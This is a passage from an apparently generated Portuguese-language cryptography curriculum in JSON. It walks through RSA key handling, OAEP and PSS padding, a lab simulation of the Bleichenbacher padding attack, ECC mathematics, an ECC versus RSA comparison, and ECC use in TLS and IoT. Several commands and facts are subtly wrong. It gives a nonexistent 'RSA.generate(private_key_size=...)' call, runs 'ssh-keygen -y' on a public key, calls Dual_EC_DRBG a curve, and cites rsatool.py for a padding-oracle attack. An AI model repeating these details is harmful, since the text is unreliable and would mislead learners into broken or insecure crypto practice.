                                  "subSteps": [
                                    "Backup seguro: copie chaves para dispositivo criptografado ou nuvem com 2FA.",
                                    "Converta formatos: 'openssl rsa -in private_key.pem -outform PEM -out private.pem' ou para PKCS#8.",
                                    "Revogue chaves comprometidas: gere novo par e atualize sistemas dependentes.",
                                    "Automatize com script: crie bash script para geração com parâmetros customizáveis.",
                                    "Monitore uso: integre com ferramentas como keychain (Mac) ou ssh-agent (Linux)."
                                  ],
                                  "verification": "Crie backup, converta formato e execute script de geração sem erros.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Editor de texto para scripts",
                                    "Ferramentas de backup (rsync, Git criptografado)"
                                  ],
                                  "tips": "Nunca commite chaves privadas em repositórios públicos; use .gitignore.",
                                  "learningObjective": "Aplicar práticas de gerenciamento para lifecycle completo de chaves RSA.",
                                  "commonMistakes": [
                                    "Compartilhar privada acidentalmente",
                                    "Ignorar revogação após suspeita",
                                    "Formatos incompatíveis"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Verificar e Testar o Par de Chaves",
                                  "subSteps": [
                                    "Teste criptografia: 'echo \"teste\" | openssl rsautl -encrypt -pubin -inkey public_key.pem -out encrypted.bin'.",
                                    "Descriptografia: 'openssl rsautl -decrypt -inkey private_key.pem -in encrypted.bin'.",
                                    "Valide integridade: use 'openssl rsa -check -in private_key.pem'.",
                                    "Teste em contexto real: configure SSH com chaves geradas ('ssh-keygen -y -f public_key.pem').",
                                    "Analise segurança: verifique entropia com 'rngtest < /dev/random' e tamanho efetivo."
                                  ],
                                  "verification": "Criptografe e descriptografe mensagem com sucesso, confirmando texto original.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "OpenSSL",
                                    "Cliente SSH para teste opcional"
                                  ],
                                  "tips": "Use mensagens longas para testar limites de RSA (padded).",
                                  "learningObjective": "Validar funcionalidade e segurança das chaves geradas.",
                                  "commonMistakes": [
                                    "Esquecer padding (use -oaep)",
                                    "Chaves corrompidas por edição texto",
                                    "Testes sem passphrase"
                                  ]
                                }
                              ],
                              "practicalExample": "Gere um par de chaves RSA 2048 bits com OpenSSL, configure a pública em um servidor Apache para HTTPS via mod_ssl, proteja a privada com passphrase e teste conexão segura com curl https://seudominio.com.",
                              "finalVerifications": [
                                "Explica corretamente parâmetros RSA e segurança de 2048 bits.",
                                "Gera par de chaves sem erros usando OpenSSL.",
                                "Gerencia chaves com backups e permissões corretas.",
                                "Testa criptografia/descriptografia com sucesso.",
                                "Identifica e corrige erros comuns em gerenciamento."
                              ],
                              "assessmentCriteria": [
                                "Precisão nos comandos OpenSSL (sem sintaxe errada).",
                                "Compreensão de segurança (tamanho chave, proteção).",
                                "Qualidade dos testes e verificações realizadas.",
                                "Documentação clara de passos e lições aprendidas.",
                                "Aplicação em cenário prático sem vulnerabilidades.",
                                "Tempo de execução dentro dos estimados."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Teoria dos Números, Primos e Fatoração.",
                                "Programação: Scripts Bash/Python para automação de chaves.",
                                "Redes: Integração com protocolos como SSH, HTTPS e TLS.",
                                "Ética e Direito: Conformidade com regulamentações como LGPD/GDPR em chaves.",
                                "Sistemas Operacionais: Gerenciamento de permissões e agents."
                              ],
                              "realWorldApplication": "Geração de certificados para servidores web (HTTPS em e-commerces), autenticação SSH em infra DevOps, assinatura digital de binários em atualizações de software, e chaves para VPNs corporativas protegendo dados sensíveis."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.4.2.1"
                            ]
                          },
                          {
                            "id": "10.1.2.4.2.3",
                            "name": "Aplicar RSA para Confidencialidade e Assinatura",
                            "description": "Implementar criptografia e assinatura de mensagens com RSA, verificando vulnerabilidades como padding inadequado (ex: ataque PKCS#1 v1.5) e uso híbrido com cifradores simétricos para eficiência.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Gerar Par de Chaves RSA e Entender Operações Básicas",
                                  "subSteps": [
                                    "Instale a biblioteca cryptography em Python: pip install cryptography.",
                                    "Gere um par de chaves RSA de 2048 bits usando RSA.generate(private_key_size=2048).",
                                    "Extraia a chave pública e privada separadamente para uso em encriptação e assinatura.",
                                    "Implemente funções básicas de encriptação/decryptação sem padding para entender o processo matemático.",
                                    "Teste com uma mensagem curta e observe o tamanho da saída cifrada."
                                  ],
                                  "verification": "Execute o código e confirme que a mensagem é decriptada corretamente sem erros.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Python 3.x",
                                    "Biblioteca cryptography",
                                    "Editor de código (VS Code ou Jupyter)"
                                  ],
                                  "tips": "Sempre use chaves de pelo menos 2048 bits para segurança prática; teste com mensagens de tamanho < chave pública.",
                                  "learningObjective": "Compreender geração de chaves RSA e operações primitivas de encriptação/decryptação.",
                                  "commonMistakes": [
                                    "Usar chaves muito pequenas (ex: 512 bits)",
                                    "Confundir ordem de expoentes (e vs d)",
                                    "Não importar corretamente os módulos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Encriptação para Confidencialidade com Padding OAEP",
                                  "subSteps": [
                                    "Use public_key.encrypt(mensagem, OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)) para encriptar.",
                                    "Decripte com private_key.decrypt(cifrado, OAEP(...)) idêntico.",
                                    "Teste com mensagens maiores que suportam hybrid padding.",
                                    "Adicione tratamento de exceções para mensagens inválidas.",
                                    "Compare tamanho da entrada/saída para entender eficiência."
                                  ],
                                  "verification": "Encripte uma mensagem longa, decripte e confirme igualdade byte-a-byte.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Python com cryptography",
                                    "Documentação RSA OAEP da cryptography.io"
                                  ],
                                  "tips": "OAEP previne ataques de padding oracle; sempre use hash SHA256 ou superior.",
                                  "learningObjective": "Aplicar padding seguro para encriptação RSA, garantindo confidencialidade.",
                                  "commonMistakes": [
                                    "Omitir padding (leva a malleability)",
                                    "Usar PKCS1v15 para encriptação (vulnerável)",
                                    "Não alinhar parâmetros OAEP"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Assinatura Digital com Padding PSS",
                                  "subSteps": [
                                    "Gere hash da mensagem com SHA256.",
                                    "Assine com private_key.sign(hash, padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH), hashes.SHA256()).",
                                    "Verifique com public_key.verify(hash, assinatura, padding PSS idêntico).",
                                    "Teste assinaturas válidas e inválidas (alterar mensagem ou chave).",
                                    "Integre encriptação e assinatura em um fluxo completo."
                                  ],
                                  "verification": "Assine mensagem, altere-a e confirme que verificação falha; valide original.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Mesmos do Step 1",
                                    "Exemplos de assinatura da doc cryptography"
                                  ],
                                  "tips": "PSS é probabilisticamente seguro contra forjarias; salt_length MAX_LENGTH é recomendado.",
                                  "learningObjective": "Criar assinaturas RSA para autenticidade e integridade de mensagens.",
                                  "commonMistakes": [
                                    "Assinar mensagem direta sem hash",
                                    "Usar padding PKCS1v15 para assinatura (existential forgery)",
                                    "Ignorar salt"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar Vulnerabilidades como Ataques de Padding PKCS#1 v1.5",
                                  "subSteps": [
                                    "Implemente uma versão vulnerável usando PKCS1v15 para encriptação.",
                                    "Simule ataque Bleichenbacher: envie cifrados modificados e observe respostas de decrypt.",
                                    "Use ferramenta como rsatool.py para demonstrar recuperação de chave ou mensagem.",
                                    "Compare com OAEP e mostre falha no PKCS1v15.",
                                    "Documente mitigações: migrar para OAEP/PSS."
                                  ],
                                  "verification": "Execute ataque e recupere parte da mensagem plaintext.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Script rsatool.py de GitHub",
                                    "cryptography com legacy support"
                                  ],
                                  "tips": "Nunca use PKCS1v15 em produção; teste em ambiente isolado para evitar leaks reais.",
                                  "learningObjective": "Detectar e mitigar falhas de padding em implementações RSA.",
                                  "commonMistakes": [
                                    "Confundir encriptação com assinatura no padding",
                                    "Não isolar timing side-channels",
                                    "Ignorar versão da lib"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Implementar Esquema Híbrido RSA + Cifrador Simétrico (AES)",
                                  "subSteps": [
                                    "Gere chave AES-256 aleatória.",
                                    "Encripte mensagem com AES-GCM usando cryptography.primitive.",
                                    "Encripte a chave AES com RSA-OAEP.",
                                    "Combine: RSA_enc(AES_key) + AES_enc(mensagem) + tag GCM.",
                                    "Decripte na ordem reversa e verifique autenticação GCM.",
                                    "Teste eficiência com mensagens grandes."
                                  ],
                                  "verification": "Encripte arquivo >1MB, decripte e confirme integridade com tag GCM.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "cryptography full",
                                    "Arquivos de teste grandes"
                                  ],
                                  "tips": "Híbrido resolve lentidão RSA para dados grandes; GCM adiciona AEAD.",
                                  "learningObjective": "Otimizar RSA com simétricos para aplicações reais eficientes.",
                                  "commonMistakes": [
                                    "Não randomizar AES key",
                                    "Vazar chave AES sem encriptar",
                                    "Ignorar nonce IV no GCM"
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva um script Python onde um servidor encripta dados sensoriais (ex: JSON de transação) com AES-GCM usando chave encriptada por RSA público do cliente, assina metadados com chave privada do servidor, e o cliente verifica assinatura, decifra chave AES e decifra dados. Demonstre falha ao trocar para PKCS1v15.",
                              "finalVerifications": [
                                "Geração de chaves RSA sem erros e chaves válidas.",
                                "Encriptação/decryptação OAEP com mensagens arbitrárias.",
                                "Assinatura PSS verifica apenas mensagens autênticas.",
                                "Ataque PKCS#1 v1.5 recupera plaintext parcial.",
                                "Híbrido AES+RSA processa arquivos grandes sem crash.",
                                "Tempo de execução híbrido << RSA puro para 1MB+."
                              ],
                              "assessmentCriteria": [
                                "Código usa apenas APIs seguras (OAEP/PSS/GCM).",
                                "Tratamento completo de exceções e validações.",
                                "Eficiência demonstrada com benchmarks simples.",
                                "Documentação clara com comentários e README.",
                                "Testes unitários cobrem casos edge e inválidos.",
                                "Compreensão verbal de vulnerabilidades explicada."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Teoria dos Números (primos, Euler totient).",
                                "Programação: Manipulação de bytes/hex em Python.",
                                "Redes: Integração com TLS/HTTPS (OpenSSL usa RSA híbrido).",
                                "Ética: Responsabilidade em implementações crypto seguras.",
                                "Física/Engenharia: Side-channels (timing/power) em hardware."
                              ],
                              "realWorldApplication": "Em protocolos como TLS 1.3 para HTTPS (chave exchange RSA-like via ECDH, mas assinatura RSA), S/MIME para emails assinados/encriptados, assinatura de binários em updates de software (ex: Apple/Google), e VPNs/IPsec para túneis seguros."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.4.2.2"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.4.3",
                        "name": "Criptografia de Curvas Elípticas (ECC)",
                        "description": "Sistema assimétrico baseado na dificuldade do problema do logaritmo discreto em curvas elípticas sobre campos finitos, oferecendo equivalente segurança ao RSA com chaves menores e maior eficiência computacional.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.4.3.1",
                            "name": "Compreender os Fundamentos Matemáticos do ECC",
                            "description": "Explicar curvas elípticas y² = x³ + ax + b mod p, operações de ponto (adição e duplicação), geração de chaves via multiplicação escalar Q = d * G (ponto base), e problemas de segurança como ECDLP.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender a Equação das Curvas Elípticas e Campos Finitos",
                                  "subSteps": [
                                    "Estude a equação geral y² = x³ + ax + b, onde a e b são constantes.",
                                    "Aprenda sobre curvas elípticas sobre campos finitos mod p (primo p).",
                                    "Verifique as condições para que a curva seja não-singular (4a³ + 27b² ≠ 0 mod p).",
                                    "Explore exemplos como secp256k1 usada no Bitcoin.",
                                    "Pratique plotando pontos válidos em um campo finito pequeno (ex: p=23)."
                                  ],
                                  "verification": "Derivar corretamente a equação e listar 5 pontos válidos em um campo finito exemplo.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Papel e caneta",
                                    "Calculadora modular",
                                    "Software de plotagem como Desmos ou SageMath"
                                  ],
                                  "tips": "Comece com campos pequenos (p<50) para visualizar manualmente.",
                                  "learningObjective": "Compreender a estrutura matemática básica das curvas elípticas em criptografia.",
                                  "commonMistakes": [
                                    "Confundir campos reais com finitos",
                                    "Ignorar a condição de não-singularidade",
                                    "Erros em cálculos modulares"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Dominar Operações de Ponto: Adição e Duplicação",
                                  "subSteps": [
                                    "Aprenda a adição de pontos distintos P + Q usando a linha secante e reflexão.",
                                    "Estude a duplicação de ponto 2P usando a tangente.",
                                    "Implemente fórmulas eficientes: λ para adição (λ = (yQ - yP)/(xQ - xP) mod p) e duplicação (λ = (3xP² + a)/(2yP) mod p).",
                                    "Trate casos especiais: ponto no infinito O e pontos opostos.",
                                    "Pratique computando P + Q e 2P em um exemplo com p=23."
                                  ],
                                  "verification": "Calcular corretamente P + Q e 2P para pontos dados em um campo finito.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Folha de fórmulas",
                                    "Python ou SageMath para verificação",
                                    "Tabela de multiplicação modular"
                                  ],
                                  "tips": "Use inversos modulares via Algoritmo Estendido de Euclides.",
                                  "learningObjective": "Executar operações aritméticas em pontos de curvas elípticas com precisão.",
                                  "commonMistakes": [
                                    "Esquecer inverso modular",
                                    "Confundir adição com duplicação",
                                    "Ignorar ponto no infinito"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Compreender Geração de Chaves via Multiplicação Escalar",
                                  "subSteps": [
                                    "Entenda Q = d * G, onde G é ponto base, d é escalar privado.",
                                    "Aprenda algoritmos eficientes: Double-and-Add (duplicação e adição condicional).",
                                    "Represente d em binário e processe bit a bit (ex: d=13=1101b → 2*(2*(G + G)) + G).",
                                    "Discuta escolha de G (ordem grande) e tamanho de d (256 bits para segurança).",
                                    "Simule multiplicação escalar para d pequeno em curva exemplo."
                                  ],
                                  "verification": "Implementar e executar Q = 5 * G manualmente ou via código simples.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Implementação Python básica",
                                    "Documentação de curvas NIST/secp",
                                    "Calculadora"
                                  ],
                                  "tips": "Otimize com janela deslizante para escalares grandes.",
                                  "learningObjective": "Gerar chaves públicas a partir de privadas usando multiplicação escalar.",
                                  "commonMistakes": [
                                    "Processar bits da esquerda para direita incorretamente",
                                    "Usar G com ordem pequena",
                                    "Vazar d via side-channel"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Problemas de Segurança: ECDLP",
                                  "subSteps": [
                                    "Defina ECDLP: dado Q e G, encontrar d tal que Q = d * G.",
                                    "Compare complexidade com DLP em campos finitos (ECC mais eficiente).",
                                    "Estude ataques: Pollard's Rho (O(sqrt(n)) operações), baby-step giant-step.",
                                    "Discuta parâmetros seguros (curvas NIST, Brainpool) e curvas seguras vs. vulneráveis (Dual_EC_DRBG).",
                                    "Avalie vantagens de ECC: chaves menores, velocidade."
                                  ],
                                  "verification": "Explicar por que ECDLP é difícil e citar um ataque com complexidade.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Artigos sobre ECDLP",
                                    "Vídeos explicativos (ex: Khan Academy ou Crypto101)",
                                    "Lista de curvas recomendadas"
                                  ],
                                  "tips": "Relacione com log discreto clássico para analogia.",
                                  "learningObjective": "Identificar bases de segurança do ECC e ameaças potenciais.",
                                  "commonMistakes": [
                                    "Subestimar Pollard's Rho",
                                    "Confundir ECDLP com fatoração",
                                    "Ignorar curvas fracas"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando Python com a biblioteca `ecdsa`, implemente uma curva secp256k1, escolha G base, gere chave privada d=12345, compute Q = d * G e verifique se recuperar d de Q e G é computacionalmente inviável.",
                              "finalVerifications": [
                                "Explicar verbalmente a equação y² = x³ + ax + b mod p.",
                                "Demonstrar adição e duplicação de pontos em quadro.",
                                "Calcular Q = d * G para d=7 e G dado.",
                                "Descrever ECDLP e um algoritmo de ataque.",
                                "Comparar segurança de ECC vs RSA para chaves de 256 bits.",
                                "Listar 3 curvas elípticas padrão."
                              ],
                              "assessmentCriteria": [
                                "Precisão matemática nas fórmulas (30%)",
                                "Correção nos cálculos de operações de ponto (25%)",
                                "Compreensão da multiplicação escalar e eficiência (20%)",
                                "Análise de segurança e ECDLP (15%)",
                                "Uso correto de terminologia criptográfica (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Álgebra abstrata e aritmética modular",
                                "Programação: Implementação de algoritmos numéricos em Python/Sage",
                                "Cibersegurança: Protocolos de autenticação e assinatura digital",
                                "Física: Geometria algébrica em curvas",
                                "Economia Digital: Criptomoedas como Bitcoin"
                              ],
                              "realWorldApplication": "ECC é fundamental em Bitcoin para ECDSA em transações, em TLS/HTTPS para troca de chaves em navegadores, e em dispositivos IoT para criptografia leve devido a chaves menores e maior eficiência computacional."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.4.2.1"
                            ]
                          },
                          {
                            "id": "10.1.2.4.3.2",
                            "name": "Comparar ECC e RSA",
                            "description": "Analisar vantagens do ECC (chaves menores: 256 bits ECC ≈ 3072 bits RSA, menor consumo de CPU e energia), curvas padrão (NIST P-256) e riscos como curvas fracas ou ataques side-channel.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Fundamentos do RSA",
                                  "subSteps": [
                                    "Estude o princípio matemático do RSA baseado em fatoração de números primos grandes.",
                                    "Identifique componentes chave: chaves pública/privada, módulo n = p*q, expoentes e e d.",
                                    "Calcule exemplos manuais de criptografia/decrypt com chaves pequenas (ex: n=15, e=3).",
                                    "Liste tamanhos de chaves recomendados (2048 ou 3072 bits para segurança atual).",
                                    "Pesquise vulnerabilidades conhecidas como ataques de timing ou padding oracle."
                                  ],
                                  "verification": "Resuma em 1 parágrafo os fundamentos do RSA e liste 3 componentes chave corretamente.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação OpenSSL sobre RSA",
                                    "Calculadora ou Python para exemplos matemáticos",
                                    "Artigo 'RSA Cryptosystem' da Wikipedia"
                                  ],
                                  "tips": "Comece com exemplos numéricos pequenos para visualizar o processo antes de escalar.",
                                  "learningObjective": "Compreender a base matemática e operacional do RSA para comparação posterior.",
                                  "commonMistakes": [
                                    "Confundir chaves pública e privada",
                                    "Ignorar o impacto do tamanho do módulo na segurança",
                                    "Subestimar a necessidade de primos grandes"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Revisar Fundamentos do ECC",
                                  "subSteps": [
                                    "Aprenda o problema do logaritmo discreto em curvas elípticas (ECDLP).",
                                    "Estude equação y² = x³ + ax + b mod p e pontos de ordem.",
                                    "Identifique curvas padrão como NIST P-256 (secp256r1).",
                                    "Gere chaves ECC usando ferramentas como OpenSSL (ex: openssl ecparam -genkey -name prime256v1).",
                                    "Compare visualmente curvas elípticas com gráficos online."
                                  ],
                                  "verification": "Gere uma chave ECC P-256 e explique a equação da curva em suas palavras.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "OpenSSL instalado",
                                    "Visualizador de curvas elípticas (ex: site dcode.fr)",
                                    "RFC 5480 sobre ECC"
                                  ],
                                  "tips": "Use ferramentas interativas para plotar curvas e ver pontos base.",
                                  "learningObjective": "Dominar os princípios matemáticos do ECC e curvas padrão.",
                                  "commonMistakes": [
                                    "Confundir ECC com criptografia simétrica",
                                    "Ignorar parâmetros de domínio como nome da curva",
                                    "Assumir que ECC é apenas 'menor que RSA' sem entender por quê"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar Tamanhos de Chaves e Equivalência de Segurança",
                                  "subSteps": [
                                    "Consulte tabelas de equivalência: 256-bit ECC ≈ 3072-bit RSA para ~128-bit segurança.",
                                    "Calcule e compare comprimentos de chaves em bits e bytes.",
                                    "Use ferramentas para medir força (ex: pyOpenSSL ou estimadores online).",
                                    "Discuta métricas NIST para níveis de segurança (Level 1-5).",
                                    "Crie uma tabela comparativa em Markdown ou Excel."
                                  ],
                                  "verification": "Apresente tabela mostrando 256-bit ECC equivalente a 3072-bit RSA com fontes citadas.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Tabela NIST SP 800-57",
                                    "Ferramenta keylength.com",
                                    "Planilha Google Sheets"
                                  ],
                                  "tips": "Foquem em 'security bits' symmetric equivalent para comparações justas.",
                                  "learningObjective": "Quantificar vantagens de ECC em tamanho de chaves mantendo segurança equivalente.",
                                  "commonMistakes": [
                                    "Comparar bits diretamente sem equivalência",
                                    "Usar métricas desatualizadas pré-2010",
                                    "Ignorar overhead de assinatura/verificação"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Desempenho, Vantagens e Riscos",
                                  "subSteps": [
                                    "Meça consumo CPU/energia com benchmarks (ex: OpenSSL speed rsa vs ecdsa).",
                                    "Liste vantagens ECC: menor largura de banda em mobile/IoT, assinaturas menores.",
                                    "Pesquise riscos: curvas fracas (Dual_EC_DRBG), ataques side-channel (timing, fault).",
                                    "Compare cenários: TLS handshake, blockchain signatures.",
                                    "Conclua recomendação baseada em contexto (ex: ECC para dispositivos low-power)."
                                  ],
                                  "verification": "Execute benchmark simples e liste 3 riscos ECC com mitigações.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "OpenSSL para benchmarks",
                                    "Artigo 'ECC vs RSA Performance' da Cloudflare",
                                    "Documentação sobre ataques side-channel"
                                  ],
                                  "tips": "Rode benchmarks em máquina real para dados autênticos; normalize por operação.",
                                  "learningObjective": "Avaliar trade-offs de desempenho e riscos entre ECC e RSA.",
                                  "commonMistakes": [
                                    "Superestimar velocidade sem benchmarks",
                                    "Ignorar ataques não-matemáticos em ECC",
                                    "Recomendar ECC universalmente sem contexto"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando OpenSSL, gere chaves RSA 3072-bit e ECC P-256, execute 'openssl speed rsa3072 ecdsa256' para medir tempos de assinatura/verificação, e compare tamanhos de arquivos de chaves/certificados em um handshake TLS simulado com nginx.",
                              "finalVerifications": [
                                "Explicar corretamente por que 256-bit ECC oferece segurança similar a 3072-bit RSA.",
                                "Listar pelo menos 3 vantagens de desempenho do ECC com evidências quantitativas.",
                                "Identificar NIST P-256 como curva padrão e 2 riscos associados a ECC.",
                                "Criar tabela comparativa precisa de tamanhos de chaves e performance.",
                                "Recomendar ECC vs RSA para um cenário IoT com justificativa.",
                                "Executar benchmark simples mostrando ECC mais rápido em CPU/energia."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica: Correção de fatos sobre equivalências e riscos (40%).",
                                "Profundidade de análise: Uso de benchmarks e tabelas quantitativas (30%).",
                                "Clareza na comunicação: Tabelas, resumos e exemplos práticos (15%).",
                                "Compreensão de trade-offs: Balanceamento de vantagens e riscos (10%).",
                                "Criatividade em aplicação: Conexão com cenários reais (5%)."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Álgebra abstrata e teoria de números (fatoração vs logaritmo discreto).",
                                "Hardware/Engenharia: Otimização de energia em dispositivos embarcados.",
                                "Redes: Impacto em protocolos TLS/SSL e largura de banda.",
                                "Ética/Política: Controvérsias em curvas NIST (backdoors potenciais)."
                              ],
                              "realWorldApplication": "Em IoT e mobile banking, ECC permite certificados TLS menores e handshakes mais rápidos, reduzindo bateria em smartphones; usado no Bitcoin para assinaturas ECDSA e em HTTPS moderno para eficiência em data centers."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.4.3.1"
                            ]
                          },
                          {
                            "id": "10.1.2.4.3.3",
                            "name": "Implementar ECC para Aplicações Práticas",
                            "description": "Usar bibliotecas como OpenSSL ou libsodium para gerar chaves ECC, criptografar/assinar mensagens e integrar em protocolos como TLS, destacando usos em IoT e dispositivos móveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o Ambiente de Desenvolvimento",
                                  "subSteps": [
                                    "Instale a biblioteca OpenSSL ou libsodium via gerenciador de pacotes (apt install openssl para Linux, brew install openssl para macOS).",
                                    "Verifique a instalação executando 'openssl version' ou compile um exemplo simples de libsodium.",
                                    "Configure um diretório de projeto com arquivos de teste (chaves.pem, mensagem.txt).",
                                    "Instale linguagens de programação complementares como Python com bindings (pip install cryptography para simular libsodium).",
                                    "Teste o ambiente gerando uma chave RSA básica para validar setup."
                                  ],
                                  "verification": "Execute 'openssl ecparam -list_curves' e confirme curvas ECC disponíveis como secp256r1.",
                                  "estimatedTime": "30-45 minutos",
                                  "materials": [
                                    "Terminal/Command Prompt",
                                    "OpenSSL ou libsodium instalado",
                                    "Editor de texto (VS Code)"
                                  ],
                                  "tips": "Use ambientes virtuais como venv para Python para isolar dependências.",
                                  "learningObjective": "Preparar um ambiente funcional para experimentação com ECC sem conflitos de dependências.",
                                  "commonMistakes": [
                                    "Não verificar versão da biblioteca (use versões recentes >1.1.1)",
                                    "Ignorar configurações de path no PATH do sistema"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Gerar Par de Chaves ECC",
                                  "subSteps": [
                                    "Escolha uma curva elíptica segura como prime256v1 (secp256r1).",
                                    "Gere a chave privada: 'openssl ecparam -genkey -name prime256v1 -out private_key.pem'.",
                                    "Gere a chave pública: 'openssl ec -in private_key.pem -pubout -out public_key.pem'.",
                                    "Converta chaves para formatos compatíveis com libsodium se necessário (use sodium para NaCl boxes).",
                                    "Valide as chaves com 'openssl ec -in private_key.pem -text -noout'."
                                  ],
                                  "verification": "Chaves geradas sem erros e públicas deriváveis da privada.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "OpenSSL CLI",
                                    "Arquivos .pem gerados"
                                  ],
                                  "tips": "Sempre proteja a chave privada com permissões 600 (chmod 600 private_key.pem).",
                                  "learningObjective": "Dominar geração de chaves ECC eficientes para aplicações com restrições de recursos.",
                                  "commonMistakes": [
                                    "Escolher curvas fracas como secp112r1",
                                    "Expor chave privada em repositórios públicos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Criptografar e Descriptografar Mensagens com ECC",
                                  "subSteps": [
                                    "Crie uma mensagem de teste em arquivo (echo 'Mensagem secreta' > msg.txt).",
                                    "Use ECDH para compartilhamento de chave: derive chave compartilhada com 'openssl pkeyutl'.",
                                    "Criptografe com AES-GCM usando chave derivada ECC: integre em script Python ou CLI.",
                                    "Descriptografe com chave privada receptora.",
                                    "Teste com libsodium crypto_box para autenticação integrada."
                                  ],
                                  "verification": "Mensagem criptografada descriptografada corretamente sem corrupção.",
                                  "estimatedTime": "45-60 minutos",
                                  "materials": [
                                    "Script Python com cryptography lib",
                                    "Chaves ECC geradas"
                                  ],
                                  "tips": "Combine ECC com cifras simétricas (hybrid crypto) para eficiência.",
                                  "learningObjective": "Implementar criptografia híbrida ECC para mensagens seguras em apps.",
                                  "commonMistakes": [
                                    "Não usar nonce/IV único por mensagem",
                                    "Ignorar autenticação em ECDH"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Assinar e Verificar Mensagens Digitais",
                                  "subSteps": [
                                    "Gere assinatura ECDSA: 'openssl dgst -sha256 -sign private_key.pem -out signature.bin msg.txt'.",
                                    "Verifique assinatura: 'openssl dgst -sha256 -verify public_key.pem -signature signature.bin msg.txt'.",
                                    "Integre em código para automação (use libsodium crypto_sign).",
                                    "Teste tamperando mensagem e confirmando falha na verificação.",
                                    "Compare tamanhos de assinatura entre ECC e RSA."
                                  ],
                                  "verification": "Assinatura válida para mensagem original, inválida para alterada.",
                                  "estimatedTime": "30-45 minutos",
                                  "materials": [
                                    "OpenSSL CLI",
                                    "Arquivos msg.txt e signature.bin"
                                  ],
                                  "tips": "Use hash SHA-256 ou superior para evitar colisões.",
                                  "learningObjective": "Garantir integridade e autenticidade com assinaturas ECC compactas.",
                                  "commonMistakes": [
                                    "Assinar hash em vez de mensagem padded",
                                    "Reusar nonce em assinaturas"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Integrar ECC em Aplicação Prática (TLS ou IoT Simulado)",
                                  "subSteps": [
                                    "Configure servidor TLS com ECC: gere CSR e cert com 'openssl req' e 'openssl x509'.",
                                    "Integre em app IoT simulada (Python socket com ssl.wrap_socket usando ECC cert).",
                                    "Para mobile, use libsodium em Android/iOS binding para chave ECC em sensor simulado.",
                                    "Teste handshake TLS com 'openssl s_client -connect localhost:443 -curves prime256v1'.",
                                    "Meça performance vs RSA em dispositivos low-power."
                                  ],
                                  "verification": "Conexão TLS estabelecida com cipher ECC, sem erros de handshake.",
                                  "estimatedTime": "60-90 minutos",
                                  "materials": [
                                    "Python com ssl/cryptography",
                                    "Certificados ECC",
                                    "Ferramenta como Wireshark para inspecionar"
                                  ],
                                  "tips": "Priorize curvas NIST para compatibilidade TLS.",
                                  "learningObjective": "Aplicar ECC em protocolos reais para IoT e mobile com otimização de performance.",
                                  "commonMistakes": [
                                    "Não habilitar curvas no cipher suite TLS",
                                    "Ignorar side-channel attacks em impl mobile"
                                  ]
                                }
                              ],
                              "practicalExample": "Implemente um sensor IoT simulado que envia dados criptografados via TLS para um servidor cloud, usando ECC (secp256r1) para handshake rápido em microcontroladores como ESP32, assinando payloads para autenticidade.",
                              "finalVerifications": [
